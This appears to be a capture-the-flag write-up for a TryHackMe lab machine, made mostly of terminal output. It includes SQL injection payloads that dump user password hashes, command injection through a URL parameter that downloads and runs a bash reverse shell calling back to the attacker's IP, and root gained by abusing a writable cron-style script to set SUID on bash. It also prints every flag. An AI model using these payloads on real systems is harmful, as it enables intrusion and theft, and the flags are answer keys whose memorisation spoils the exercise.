----
The Minotaur threw a fit and captured some people in the Labyrinth. Are you able to help Daedalus free them?
----

![](https://cdn.pixabay.com/photo/2013/07/13/09/46/labyrinth-155972_1280.png)

![](https://tryhackme-images.s3.amazonaws.com/room-icons/1ba093d11dfb93c3db6ebf6b7d33fb10.png)

### Task 1  Find the flags

 Start Machine

Hi, it's me, Daedalus, the creator of the Labyrinth. I was able to implement some backdoors, but Minotaur was able to (partially) fix them (that's a secret, so don't tell anyone). But let's get back to your task, root this machine and give Minotaur a lesson.

**The target machine may take a few minutes to boot up fully.**  

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.93.209 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.93.209:21
Open 10.10.93.209:80
Open 10.10.93.209:443
Open 10.10.93.209:3306
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-26 19:57 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:57
Completed NSE at 19:57, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:57
Completed NSE at 19:57, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:57
Completed NSE at 19:57, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 19:57
Completed Parallel DNS resolution of 1 host. at 19:57, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 19:57
Scanning 10.10.93.209 [4 ports]
Discovered open port 3306/tcp on 10.10.93.209
Discovered open port 443/tcp on 10.10.93.209
Discovered open port 21/tcp on 10.10.93.209
Discovered open port 80/tcp on 10.10.93.209
Completed Connect Scan at 19:57, 2.22s elapsed (4 total ports)
Initiating Service scan at 19:57
Scanning 4 services on 10.10.93.209
Completed Service scan at 19:57, 13.71s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.93.209.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:57
NSE: [ftp-bounce 10.10.93.209:21] PORT response: 500 Illegal PORT command
Completed NSE at 19:58, 15.82s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:58
Completed NSE at 19:58, 5.48s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:58
Completed NSE at 19:58, 0.00s elapsed
Nmap scan report for 10.10.93.209
Host is up, received user-set (0.22s latency).
Scanned at 2023-07-26 19:57:33 EDT for 37s

PORT     STATE SERVICE  REASON  VERSION
21/tcp   open  ftp      syn-ack ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x   3 nobody   nogroup      4096 Jun 15  2021 pub
80/tcp   open  http     syn-ack Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: C4AF3528B196E5954B638C13DDC75F2F
| http-title: Login
|_Requested resource was login.html
443/tcp  open  ssl/http syn-ack Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
|_http-favicon: Unknown favicon MD5: BE43D692E85622C2A4B2B588A8F8E2A6
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=localhost/organizationName=Apache Friends/stateOrProvinceName=Berlin/countryName=DE/localityName=Berlin
| Issuer: commonName=localhost/organizationName=Apache Friends/stateOrProvinceName=Berlin/countryName=DE/localityName=Berlin
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: md5WithRSAEncryption
| Not valid before: 2004-10-01T09:10:30
| Not valid after:  2010-09-30T09:10:30
| MD5:   b18118f61a4dcb51df5e189c40dd3280
| SHA-1: c4c9a1dc528d41ac1988f65db62f9ca922fbe711
| -----BEGIN CERTIFICATE-----
| MIIC5jCCAk+gAwIBAgIBADANBgkqhkiG9w0BAQQFADBcMQswCQYDVQQGEwJERTEP
| MA0GA1UECBMGQmVybGluMQ8wDQYDVQQHEwZCZXJsaW4xFzAVBgNVBAoTDkFwYWNo
| ZSBGcmllbmRzMRIwEAYDVQQDEwlsb2NhbGhvc3QwHhcNMDQxMDAxMDkxMDMwWhcN
| MTAwOTMwMDkxMDMwWjBcMQswCQYDVQQGEwJERTEPMA0GA1UECBMGQmVybGluMQ8w
| DQYDVQQHEwZCZXJsaW4xFzAVBgNVBAoTDkFwYWNoZSBGcmllbmRzMRIwEAYDVQQD
| Ewlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMzLZFTC+qN6
| gTZfG9UQgXW3QgIxg7HVWnZyane+YmkWq+s5ZrUgOTPRtAF9I0AknmAcqDKD6p3x
| 8tnwGIWd4cDimf+JpPkVvV26PzkuJhRIgHXvtcCUbipi0kI0LEoVF1iwVZgRbpH9
| KA2AxSHCPvt4bzgxSnjygS2Fybgr8YbJAgMBAAGjgbcwgbQwHQYDVR0OBBYEFBP8
| X524EngQ0fE/DlKqi6VEk8dSMIGEBgNVHSMEfTB7gBQT/F+duBJ4ENHxPw5Sqoul
| RJPHUqFgpF4wXDELMAkGA1UEBhMCREUxDzANBgNVBAgTBkJlcmxpbjEPMA0GA1UE
| BxMGQmVybGluMRcwFQYDVQQKEw5BcGFjaGUgRnJpZW5kczESMBAGA1UEAxMJbG9j
| YWxob3N0ggEAMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEEBQADgYEAFaDLTAkk
| p8J2SJ84I7Fp6UVfnpnbkdE2SBLFRKccSYZpoX85J2Z7qmfaQ35p/ZJySLuOQGv/
| IHlXFTt9VWT8meCpubcFl/mI701KBGhAX0DwD5OmkiLk3yGOREhy4Q8ZI+Eg75k7
| WF65KAis5duvvVevPR1CwBk7H9CDe8czwrc=
|_-----END CERTIFICATE-----
|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
|_http-title: Bad request!
| tls-alpn: 
|_  http/1.1
3306/tcp open  mysql?   syn-ack
| fingerprint-strings: 
|   NULL: 
|_    Host 'ip-10-8-19-103.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server
| mysql-info: 
|_  MySQL Error: Host 'ip-10-8-19-103.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.93%I=7%D=7/26%Time=64C1B2F0%P=x86_64-pc-linux-gnu%r(NU
SF:LL,68,"d\0\0\x01\xffj\x04Host\x20'ip-10-8-19-103\.eu-west-1\.compute\.i
SF:nternal'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20Mari
SF:aDB\x20server");

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:58
Completed NSE at 19:58, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:58
Completed NSE at 19:58, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:58
Completed NSE at 19:58, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.17 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ ftp 10.10.93.209
Connected to 10.10.93.209.
220 ProFTPD Server (ProFTPD) [::ffff:10.10.93.209]
Name (10.10.93.209:witty): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||10527|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 root     root         4096 Jun 15  2021 .
drwxr-xr-x   3 root     root         4096 Jun 15  2021 ..
drwxr-xr-x   3 nobody   nogroup      4096 Jun 15  2021 pub
226 Transfer complete
ftp> cd pub
250 CWD command successful
ftp> ls -la
229 Entering Extended Passive Mode (|||58105|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 nobody   nogroup      4096 Jun 15  2021 .
drwxr-xr-x   3 root     root         4096 Jun 15  2021 ..
drwxr-xr-x   2 root     root         4096 Jun 15  2021 .secret
-rw-r--r--   1 root     root          141 Jun 15  2021 message.txt
226 Transfer complete
ftp> more message.txt
Daedalus is a clumsy person, he forgets a lot of things arount the labyrinth, have 
a look around, maybe you'll find something :)
-- Minotaur

ftp> cd .secret
250 CWD command successful
ftp> ls -la
229 Entering Extended Passive Mode (|||59406|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 root     root         4096 Jun 15  2021 .
drwxr-xr-x   3 nobody   nogroup      4096 Jun 15  2021 ..
-rw-r--r--   1 root     root           30 Jun 15  2021 flag.txt
-rw-r--r--   1 root     root          114 Jun 15  2021 keep_in_mind.txt
226 Transfer complete
ftp> more flag.txt
fl4g{tHa75_TH3_$7Ar7_ftPFLA9}

ftp> more keep_in_mind.txt
Not to forget, he forgets a lot of stuff, that's why he likes to keep things on a t
imer ... literally
-- Minotaur

view-source:http://10.10.93.209/js/login.js

function pwdgen() {
    a = ["0", "h", "?", "1", "v", "4", "r", "l", "0", "g"]
    b = ["m", "w", "7", "j", "1", "e", "8", "l", "r", "a", "2"]
    c = ["c", "k", "h", "p", "q", "9", "w", "v", "5", "p", "4"]
}
//pwd gen for Daedalus a[9]+b[10]+b[5]+c[8]+c[8]+c[1]+a[1]+a[5]+c[0]+c[1]+c[8]+b[8]
//                             |\____/|
///                           (\|----|/)
//                             \ 0  0 /
//                              |    |
//                           ___/\../\____
//                          /     --       \

$(document).ready(function() {
    $("#forgot-password").click(function() {
        alert("Ye .... Thought it would be this easy? \n                       -_______-")
    });
    $("#submit").click(function() {
        console.log("TEST")

        var email = $("#email1").val();
        var password = $("#password1").val();

        if (email == '' || password == '') {
            alert("Please fill all fields.");
            return false;
        }

        $.ajax({
            type: "POST",
            url: "login.php",
            data: {
                email: email,
                password: password

            },
            cache: false,
            success: function(data) {
                //alert(data);
                window.location.href = "index.php"
            },
            error: function(xhr, status, error) {
                console.error(xhr);
            }
        });

    });

});

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 mino.py    
g2e55kh4ck5r

Daedalus:g2e55kh4ck5r login

search creatures
' or 1=1#

ID 	Name 	Password
1	Cerberos	3898e56bf6fa6ddfc3c0977c514a65a8
2	Pegasus	5d20441c392b68c61592b2159990abfe
3	Chiron	f847149233ae29ec0e1fcf052930c044
4	Centaurus	ea5540126c33fe653bf56e7a686b1770

and people

ID 	Name 	Password
1	Eurycliedes	42354020b68c7ed28dcdeabd5a2baf8e
2	Menekrates	0b3bebe266a81fbfaa79db1604c4e67f
3	Philostratos	b83f966a6f5a9cff9c6e1c52b0aa635b
4	Daedalus	b8e4c23686a3a12476ad7779e35f5eb6
5	M!n0taur	1765db9457f496a39859209ee81fbda4  aminotauro

or

' UNION SELECT 1,2,group_concat(namePeople,":",passwordPeople,":",permissionPeople SEPARATOR '<br>') FROM people;--

Eurycliedes:42354020b68c7ed28dcdeabd5a2baf8e:user
Menekrates:0b3bebe266a81fbfaa79db1604c4e67f:user
Philostratos:b83f966a6f5a9cff9c6e1c52b0aa635b:user
Daedalus:b8e4c23686a3a12476ad7779e35f5eb6:user
M!n0taur:1765db9457f496a39859209ee81fbda4:admin

https://md5hashing.net/hash/md5/1765db9457f496a39859209ee81fbda4

login

<a class='nav-link' href=''>fla6{7H@Ts_tHe_Dat48as3_F149}</a>

secret stuff

this is the regex used: /[#!@%^&*()$_=\[\]\';,{}:>?~\\\\]/

command injection

http://10.10.93.209/echo.php

http://10.10.93.209/echo.php?search=hi|id

uid=1(daemon) gid=1(daemon) groups=1(daemon) 

revshell
┌──(witty㉿kali)-[~]
└─$ cat revshell1 
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.8.19.103/4444 0>&1"

┌──(witty㉿kali)-[~]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.180.250 - - [26/Jul/2023 23:07:05] "GET /revshell1 HTTP/1.1" 200 -

http://10.10.180.250/echo.php?search=|wget%2010.8.19.103/revshell1%20-O%20/tmp/shell

http://10.10.180.250/echo.php?search=|chmod%20777%20/tmp/shell

http://10.10.180.250/echo.php?search=|/tmp/shell

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.180.250] 49268
bash: cannot set terminal process group (809): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
daemon@labyrinth:/opt/lampp/htdocs$ /usr/bin/script -qc /bin/bash /dev/null
daemon@labyrinth:/home/user$ cat flag.txt
cat flag.txt
fla9{5upeR_secr37_uSEr_flaG}

daemon@labyrinth:/home/user$ ls -lah /
ls -lah /
total 712M
drwxr-xr-x  26 root root 4,0K nov    9  2021 .
drwxr-xr-x  26 root root 4,0K nov    9  2021 ..
drwxr-xr-x   2 root root 4,0K szept 20  2021 bin
drwxr-xr-x   3 root root 4,0K nov    9  2021 boot
drwxrwxr-x   2 root root 4,0K jún   15  2021 cdrom
drwxr-xr-x  17 root root 4,1K júl   27 04:50 dev
drwxr-xr-x 126 root root  12K nov   10  2021 etc
drwxr-xr-x   5 root root 4,0K jún   18  2021 home
lrwxrwxrwx   1 root root   32 nov    9  2021 initrd.img -> boot/initrd.img-5.4.0-90-generic
lrwxrwxrwx   1 root root   32 nov    9  2021 initrd.img.old -> boot/initrd.img-5.4.0-89-generic
drwxr-xr-x  21 root root 4,0K jún   15  2021 lib
drwxr-xr-x   2 root root 4,0K szept 20  2021 lib64
drwx------   2 root root  16K jún   15  2021 lost+found
drwxr-xr-x   2 root root 4,0K aug    7  2020 media
drwxr-xr-x   2 root root 4,0K aug    7  2020 mnt
drwxr-xr-x   3 root root 4,0K jún   15  2021 opt
dr-xr-xr-x 246 root root    0 júl   27 04:48 proc
drwxr-xr-x   2 root root 4,0K jún   15  2021 reminders
drwx------   7 root root 4,0K jún   15  2021 root
drwxr-xr-x  29 root root  920 júl   27 05:06 run
drwxr-xr-x   2 root root  12K szept 20  2021 sbin
drwxr-xr-x  14 root root 4,0K szept 23  2021 snap
drwxr-xr-x   2 root root 4,0K jún   16  2021 srv
-rw-------   1 root root 712M jún   15  2021 swapfile
dr-xr-xr-x  13 root root    0 júl   27 04:48 sys
drwxrwxrwx   2 root root 4,0K jún   15  2021 timers
drwxrwxrwt  13 root root 4,0K júl   27 05:28 tmp
drwxr-xr-x  11 root root 4,0K aug    7  2020 usr
drwxr-xr-x  16 root root 4,0K jún   15  2021 var
lrwxrwxrwx   1 root root   29 nov    9  2021 vmlinuz -> boot/vmlinuz-5.4.0-90-generic
lrwxrwxrwx   1 root root   29 nov    9  2021 vmlinuz.old -> boot/vmlinuz-5.4.0-89-generic
daemon@labyrinth:/home/user$ cd /timers
cd /timers
daemon@labyrinth:/timers$ ls -lah
ls -lah
total 12K
drwxrwxrwx  2 root root 4,0K jún   15  2021 .
drwxr-xr-x 26 root root 4,0K nov    9  2021 ..
-rwxrwxrwx  1 root root   70 jún   15  2021 timer.sh
daemon@labyrinth:/timers$ lsattr timer.sh
lsattr timer.sh
--------------e--- timer.sh
daemon@labyrinth:/timers$ cat timer.sh
cat timer.sh
#!/bin/bash
echo "dont fo...forge...ttt" >> /reminders/dontforget.txt

daemon@labyrinth:/timers$ echo "chmod u+s /bin/bash" > timer.sh
echo "chmod u+s /bin/bash" > timer.sh
daemon@labyrinth:/timers$ ls -lah /bin/bash
ls -lah /bin/bash
-rwxr-xr-x 1 root root 1,1M jún    7  2019 /bin/bash
daemon@labyrinth:/timers$ ls -lah /bin/bash
ls -lah /bin/bash
-rwsr-xr-x 1 root root 1,1M jún    7  2019 /bin/bash

daemon@labyrinth:/timers$ /bin/bash -p
/bin/bash -p
id
uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)
cd /root
ls
da_king_flek.txt
snap
xampp_setup_job
cat da_king_flek.txt
fL4G{YoU_R0OT3d_1T_coN9ra7$}

```

What is flag 1?  

*fl4g{tHa75_TH3_$7Ar7_ftPFLA9}*

What is flag 2?  

*fla6{7H@Ts_tHe_Dat48as3_F149}*

What is the user flag?  

	this is the regex used: /[#!@%^&*()$_=\[\]\';,{}:>?~\\\\]/

*fla9{5upeR_secr37_uSEr_flaG}*

What is the root flag?

*fL4G{YoU_R0OT3d_1T_coN9ra7$}*

[[Ghizer]]